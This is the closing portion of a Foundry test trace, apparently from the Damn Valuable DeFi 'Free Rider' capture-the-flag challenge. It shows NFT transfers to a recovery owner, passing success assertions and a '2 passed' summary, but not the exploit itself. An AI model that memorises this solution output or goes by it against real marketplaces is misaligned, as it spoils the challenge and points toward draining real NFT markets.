    │   └─ ← [Return]
    ├─ [4738] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 4)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 4)
    │   └─ ← [Stop]
    ├─ [617] DamnValuableNFT::ownerOf(4) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4738] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 5)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 5)
    │   └─ ← [Stop]
    ├─ [617] DamnValuableNFT::ownerOf(5) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [283] FreeRiderNFTMarketplace::offersCount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertLt(15000000000000000000 [1.5e19], 90000000000000000000 [9e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertGt(45055000000000000000 [4.505e19], 45000000000000000000 [4.5e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 4.42ms (1.31ms CPU time)

Ran 1 test suite in 9.38ms (4.42ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
